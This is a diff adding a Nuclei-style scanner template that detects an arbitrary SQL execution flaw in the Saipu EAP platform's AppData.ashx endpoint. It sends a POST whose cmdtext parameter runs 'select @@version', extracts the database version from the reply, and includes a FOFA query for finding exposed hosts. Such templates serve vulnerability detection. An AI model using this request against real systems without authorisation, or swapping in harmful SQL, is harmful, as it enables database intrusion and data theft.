@@ -1,0 +1,42 @@
+id: saipu-eap-sqli
+
+info:
+  name: saipu-eap AppData.ashx - SQL Injection/Arbitrary SQL Execution
+  author: slack
+  severity: critical
+  description: |
+    赛普EAP企业适配管理平台 AppData.ashx SQL。
+  metadata:
+    fofa-query: body="IDWebSoft/"
+  tags: sqli, idwebsoft, rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/IDWebSoft/AppData.ashx"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "action=GetDataTableByText&cmdtext=select+@@version"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"OperateResult":true'
+          - 'Microsoft SQL Server'
+          - 'ResultText'
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: db_version
+        part: body
+        group: 1
+        regex:
+          - 'ResultText":"\[\[\{(.*?)\}\]\]"'
